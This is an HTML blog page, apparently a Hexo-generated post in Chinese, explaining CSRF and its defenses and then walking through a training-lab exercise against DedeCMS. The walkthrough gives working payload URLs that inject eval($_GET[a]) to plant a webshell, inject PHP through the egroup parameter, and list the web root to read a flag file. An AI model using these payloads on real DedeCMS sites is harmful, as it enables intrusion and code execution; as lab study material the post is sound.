@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="##CSRF是什么？ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的. CSRF攻击的本质原因 CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/blog1/csrf.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="##CSRF是什么？ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的. CSRF攻击的本质原因 CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/upload/md/b8eb04f50553c9a587682c0879fb7ded_24901.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/6d8519f8a2a5f23e558ea7b32ac609cd_74360.png">
+<meta property="og:updated_time" content="2019-10-20T13:37:25.525Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="##CSRF是什么？ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的. CSRF攻击的本质原因 CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的">
+<meta name="twitter:image" content="http://yoursite.com/upload/md/b8eb04f50553c9a587682c0879fb7ded_24901.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog1/csrf.html" class="article-date">
+  <time datetime="2019-10-20T13:37:25.530Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="CSRF是什么？-CSRF（Cross-Site-Request-Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的-CSRF攻击的本质原因-CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决-CSRF漏洞原理-因为web应用程序在用户进行敏感操作时-修改密码-转账等-没有校验token或者http请求头的referfer值-从而导致恶意攻击者利用用户身份-cookie-完成攻击行为-简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。-CSRF攻击的原理-CSRF可以干什么-1-盗取或修改账号-2-个人身份泄露以及财产安全-3-对用户的账号进行操作"><a href="#CSRF是什么？-CSRF（Cross-Site-Request-Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的-CSRF攻击的本质原因-CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决-CSRF漏洞原理-因为web应用程序在用户进行敏感操作时-修改密码-转账等-没有校验token或者http请求头的referfer值-从而导致恶意攻击者利用用户身份-cookie-完成攻击行为-简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。-CSRF攻击的原理-CSRF可以干什么-1-盗取或修改账号-2-个人身份泄露以及财产安全-3-对用户的账号进行操作" class="headerlink" title="##CSRF是什么？ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的. CSRF攻击的本质原因 CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决 CSRF漏洞原理: 因为web应用程序在用户进行敏感操作时(修改密码,转账等),没有校验token或者http请求头的referfer值,从而导致恶意攻击者利用用户身份(cookie)完成攻击行为.(简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。) CSRF攻击的原理: CSRF可以干什么: 1.盗取或修改账号 2.个人身份泄露以及财产安全 3.对用户的账号进行操作 "></a>##CSRF是什么？ CSRF（Cross Site Request Forgery），中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的. CSRF攻击的本质原因 CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。CSRF攻击的一般是由服务端解决 CSRF漏洞原理: 因为web应用程序在用户进行敏感操作时(修改密码,转账等),没有校验token或者http请求头的referfer值,从而导致恶意攻击者利用用户身份(cookie)完成攻击行为.(简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。) CSRF攻击的原理: CSRF可以干什么: 1.盗取或修改账号 2.个人身份泄露以及财产安全 3.对用户的账号进行操作 </h2><h3 id="CSRF工具的防御手段-1-尽量使用POST，限制GET-2-添加验证码-验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击-3-验证referer-HTTP-Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。-4-使用token-这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露-————"><a href="#CSRF工具的防御手段-1-尽量使用POST，限制GET-2-添加验证码-验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击-3-验证referer-HTTP-Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。-4-使用token-这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露-————" class="headerlink" title="CSRF工具的防御手段: 1. 尽量使用POST，限制GET 2. 添加验证码(验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击) 3.验证referer(HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。) 4.使用token(这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露) ————"></a>CSRF工具的防御手段: 1. 尽量使用POST，限制GET 2. 添加验证码(验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击) 3.验证referer(HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，会带上Referer，通过验证Referer，可以判断请求的合法性，如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求。) 4.使用token(这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露) ————</h3><p>##打开靶场： <a href="http://59.63.200.79:8010/csrf/uploads/" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/</a> <img src="/upload/md/b8eb04f50553c9a587682c0879fb7ded_24901.png" alt> 发现是织梦的cms 找后台登录界面： <a href="http://59.63.200.79:8010/csrf/uploads/dede/login.php" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/login.php</a> 试着admin/admin123登录 漏洞原理分析： 参照参考资料 经过代码审计 第一个漏洞代码在:/dede/sys_verifies.php 得知会在/data目录下生成一个inc文件，并且这个inc文件的内容是我们可以控制的，因此只需要再找一个包含了这个inc文件的地方，便可以完成攻击。而且经过分析 另一个包含了这个inc文件 在同一个php文件的下面 参考资料上构造好的payload <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_GET[a]);die();//</a> 触发shell <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo()" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=phpinfo()</a>; 但是这个需要管理员权限才能触发，所以需要利用第二个漏洞 漏洞代码在：/dede/sys_cache_up.php 根据参考资料构造好的payload 传入如下url： <a href="http://59.63.200.79:8010/csrf/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=2334&amp;egroup=;phpinfo();$&amp;issign=1" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/stepselect_main.php?action=addenum_save&amp;ename=2334&amp;egroup=;phpinfo();$&amp;issign=1</a> 然后被写入了数据库，此时直接查询，便可以写入文件，写文件url如下： <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_cache_up.php?step=2&amp;egroup=a=1;phpinfo();&amp;dopost=ok</a> 找到网站根目录 读取网站根目录文件 <a href="http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=$dir=dirname(&#39;C:/phpStudy/WWW/csrf/uploads/&#39;);$file" target="_blank" rel="noopener">http://59.63.200.79:8010/csrf/uploads/dede/sys_verifies.php?action=down&amp;a=$dir=dirname(&#39;C:/phpStudy/WWW/csrf/uploads/&#39;);$file</a> = scandir($dir);print_r($file); 读取文件flag.php 找到flag <img src="/upload/md/6d8519f8a2a5f23e558ea7b32ac609cd_74360.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/blog1/csrf.html" data-id="ck1z1u11e000kycv0jfymoxh6" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/csrf/">csrf</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
